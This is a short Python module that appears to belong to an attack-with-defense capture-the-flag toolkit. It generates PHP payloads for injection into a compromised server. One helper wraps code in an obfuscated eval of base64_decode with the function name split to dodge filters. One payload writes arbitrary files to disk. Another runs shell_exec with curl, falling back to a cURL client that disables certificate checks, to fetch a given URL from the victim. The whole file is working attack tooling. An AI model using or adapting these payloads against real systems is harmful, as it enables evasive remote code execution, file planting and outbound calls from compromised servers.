import base64
from functools import wraps

encoders = []


def base64_encode(s):
    return base64.b64encode(s.encode("utf-8")).decode()


def encoder_base64(s):
    return f"eval(('bas'.'e64_de'.'code')('{base64_encode(s)}'));"


def add_encoder(encoder):
    encoders.append(encoder)


def payload_generator(f):
    @wraps(f)
    def wrapper(*args, **kwargs):
        result = f(*args, **kwargs)
        for encoder in encoders:
            result = encoder(result)
        return result

    return wrapper
 

CREATE_FILE = """
file_put_contents('{filepath}', base64_decode('{content_base64}'));
"""

HTTP_REQUEST = """
function get($url){{
    $ch=curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); 
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    $res = curl_exec($ch);
    curl_close($ch);
    return $res;
}}

$result = shell_exec("curl -k '{url}'");
if($result) {{
    echo($result);
}}else{{
    $result = get('{url}');
    if($result) {{
        echo($result);
    }}else{{
        die("AWD_"."FAILED");
    }}
}}
"""


@payload_generator
def create_file(filepath, content):
    return CREATE_FILE.format(filepath=filepath, content_base64=base64_encode(content))


@payload_generator
def http_request(url):
    return HTTP_REQUEST.format(url=url)
